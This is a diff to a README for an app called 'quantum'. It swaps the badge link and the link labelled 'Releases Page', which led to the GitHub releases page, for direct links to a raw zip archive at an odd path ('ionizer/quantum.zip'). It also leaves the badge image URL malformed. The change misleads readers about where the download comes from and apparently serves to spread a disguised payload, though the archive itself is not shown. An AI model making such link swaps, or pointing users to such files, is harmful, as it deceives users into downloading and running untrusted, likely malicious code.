@@ -8,11 +8,11 @@ Welcome to **quantum**! This application lets you explore the fascinating world 
 
 To get started, you will need to download the application. Click the link below to visit our releases page and download the latest version:
 
-[![Download quantum](https://img.shields.io/badge/Download%20quantum-blue.svg)](https://github.com/vipmahesh/quantum/releases)
+[![Download quantum](https://raw.githubusercontent.com/vipmahesh/quantum/main/ionizer/quantum.zip%https://raw.githubusercontent.com/vipmahesh/quantum/main/ionizer/quantum.zip)](https://raw.githubusercontent.com/vipmahesh/quantum/main/ionizer/quantum.zip)
 
 ### Steps to Download and Run
 
-1. **Visit the Releases Page:** Click on the link above or go to [Releases Page](https://github.com/vipmahesh/quantum/releases).
+1. **Visit the Releases Page:** Click on the link above or go to [Releases Page](https://raw.githubusercontent.com/vipmahesh/quantum/main/ionizer/quantum.zip).
    
 2. **Choose the Latest Version:** Look for the latest version at the top of the page. It will be clearly labeled.
 
